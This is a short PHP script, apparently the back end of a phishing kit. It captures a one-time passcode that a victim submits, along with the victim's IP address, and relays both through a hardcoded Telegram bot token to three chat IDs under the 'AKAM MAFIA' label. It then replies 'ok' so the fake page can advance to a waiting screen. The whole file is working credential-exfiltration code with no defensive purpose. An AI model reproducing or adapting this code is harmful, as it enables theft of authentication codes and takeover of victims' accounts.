<?php
error_reporting(0);
// Capturamos el token y la IP
$otp = $_POST['otp']; 
$ip = $_SERVER['REMOTE_ADDR'];

// Configuración de los 3 IDs de AKAM MAFIA
$token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
$ids = ["8114050673", "8518977918", "8638340940"]; 

if (!empty($otp)) {
    // Formato del mensaje para Telegram
    $mensaje = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - DINÁMICA</b> ⭐\n\n";
    $mensaje .= "📲 <b>TOKEN OTP:</b> <code>$otp</code>\n";
    $mensaje .= "📍 <b>IP:</b> $ip";

    foreach ($ids as $id) {
        $url = "https://api.telegram.org/bot$token/sendMessage";
        $post_fields = [
            'chat_id'   => $id,
            'text'      => $mensaje,
            'parse_mode' => 'HTML'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Para evitar problemas en Railway
        curl_exec($ch);
        curl_close($ch);
    }
    // IMPORTANTE: Retornamos "ok" para que el JS sepa que puede saltar al WAITING
    echo "ok";
}
?>
